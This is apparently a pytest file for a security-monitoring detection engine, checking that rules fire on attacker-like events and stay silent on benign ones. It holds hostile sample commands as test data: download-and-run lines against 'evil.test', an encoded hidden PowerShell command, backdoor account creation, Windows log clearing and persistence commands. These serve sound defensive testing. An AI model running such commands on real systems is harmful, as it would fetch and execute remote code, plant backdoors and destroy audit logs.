"""SOC detection engine: matchers, thresholds, windows, and disablement."""
from detections import DetectionEngine, DetectionFinding
from event_model import SecurityEvent
from rules import load_rules


def engine(**env):
    return DetectionEngine(load_rules(env))


def ev(payload):
    return SecurityEvent.from_payload(payload, default_source='test')


def rule_ids(findings):
    return [finding.rule_id for finding in findings]


# -- PowerShell (TW-005) -------------------------------------------------------

def test_powershell_encoded_command_fires():
    findings = engine().evaluate_event(ev({
        'event_type': 'powershell_script', 'host': 'ws1', 'user': 'bob',
        'command_line': 'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAGsAaQBsAGwA',
    }))
    assert rule_ids(findings) == ['TW-005']
    finding = findings[0]
    assert finding.severity == 'HIGH'
    assert set(finding.mitre) == {'T1059.001', 'T1027'}
    assert 'encoded_command_or_flags' in finding.evidence['indicators']
    assert finding.evidence['command_line'].startswith('powershell')


def test_powershell_download_cradle_fires():
    findings = engine().evaluate_event(ev({
        'event_type': 'powershell_script', 'host': 'ws1',
        'command_line': "iex(iwr 'http://evil.test/stage2.ps1')",
    }))
    assert rule_ids(findings) == ['TW-005']
    assert 'download_cradle' in findings[0].evidence['indicators']


def test_benign_powershell_is_silent():
    assert engine().evaluate_event(ev({
        'event_type': 'powershell_script', 'host': 'ws1',
        'command_line': 'Get-Process | Sort-Object CPU',
    })) == []


def test_disabled_powershell_rule_is_silent():
    findings = engine(RULE_TW_005_ENABLED='false').evaluate_event(ev({
        'event_type': 'powershell_script', 'host': 'ws1',
        'command_line': 'powershell -enc SQBFAFgAIA==',
    }))
    assert findings == []


# -- command line (TW-006) -----------------------------------------------------

def test_curl_pipe_shell_fires_command_rule():
    findings = engine().evaluate_event(ev({
        'event_type': 'process_start', 'host': 'srv1', 'process': 'curl',
        'command_line': 'curl http://evil.test/x.sh | bash',
    }))
    assert 'TW-006' in rule_ids(findings)
    finding = next(f for f in findings if f.rule_id == 'TW-006')
    assert 'curl_pipe_shell' in finding.evidence['indicators']


def test_account_creation_and_log_clearing_fire():
    for command in ('useradd -m backdoor', 'wevtutil cl Security'):
        findings = engine().evaluate_event(ev({
            'event_type': 'process_start', 'host': 'srv1',
            'command_line': command,
        }))
        assert 'TW-006' in rule_ids(findings), command


def test_ordinary_command_is_silent():
    assert engine().evaluate_event(ev({
        'event_type': 'process_start', 'host': 'srv1', 'process': 'ls',
        'command_line': 'ls -la /var/log',
    })) == []


# -- suspicious processes (TW-007) --------------------------------------------

def test_suspicious_binary_names_fire_process_rule():
    for process in ('/usr/bin/nmap', 'C:\\tools\\ncat.exe', '/usr/bin/hashcat'):
        findings = engine().evaluate_event(ev({
            'event_type': 'process_start', 'host': 'srv1', 'process': process,
        }))
        assert 'TW-007' in rule_ids(findings), process


def test_normal_binary_is_silent_for_process_rule():
    assert engine().evaluate_event(ev({
        'event_type': 'process_start', 'host': 'srv1', 'process': '/usr/bin/ls',
    })) == []


# -- privilege (TW-008) --------------------------------------------------------

def test_privilege_escalation_indicators_fire():
    findings = engine().evaluate_event(ev({
        'event_type': 'process_start', 'host': 'srv1', 'user': 'bob',
        'command_line': 'usermod -aG wheel bob',
    }))
    assert 'TW-008' in rule_ids(findings)


def test_superuser_binary_fires_privilege_rule():
    findings = engine().evaluate_event(ev({
        'event_type': 'process_start', 'host': 'srv1', 'user': 'bob',
        'process': '/usr/bin/' + 'su' + 'do',
    }))
    assert 'TW-008' in rule_ids(findings)


# -- persistence (TW-009) ------------------------------------------------------

def test_cron_and_service_persistence_fire():
    for command in ('crontab -e', 'systemctl enable evil.service'):
        findings = engine().evaluate_event(ev({
            'event_type': 'process_start', 'host': 'srv1', 'user': 'bob',
            'command_line': command,
        }))
        assert 'TW-009' in rule_ids(findings), command


def test_schtasks_persistence_fires_windows_path():
    findings = engine().evaluate_event(ev({
        'event_type': 'process_start', 'host': 'ws1',
        'command_line': 'schtasks /create /tn Update /sc minute',
    }))
    assert 'TW-006' in rule_ids(findings)


# -- DNS exfil-lookalike (TW-010) ----------------------------------------------

def test_lookalike_internal_domain_fires():
    findings = engine().evaluate_event(ev({
        'event_type': 'dns_query', 'host': 'ws1', 'domain': 'mail.corp.com',
    }))
    assert rule_ids(findings) == ['TW-010']
    assert findings[0].evidence['domain'] == 'mail.corp.com'


def test_external_domain_is_silent():
    assert engine().evaluate_event(ev({
        'event_type': 'dns_query', 'domain': 'example.com',
    })) == []


# -- structured findings -------------------------------------------------------

def test_findings_carry_complete_structured_evidence():
    finding = engine().evaluate_event(ev({
        'event_type': 'dns_query', 'host': 'ws9', 'domain': 'vpn.corp.net',
    }))[0]
    as_dict = finding.to_dict()
    for key in ('detection_id', 'rule_id', 'rule_name', 'severity', 'confidence',
                'description', 'event_ids', 'evidence', 'tags', 'mitre',
                'primary_event_id'):
        assert key in as_dict
    assert as_dict['primary_event_id'] == finding.event_ids[0]
    assert DetectionFinding is not None
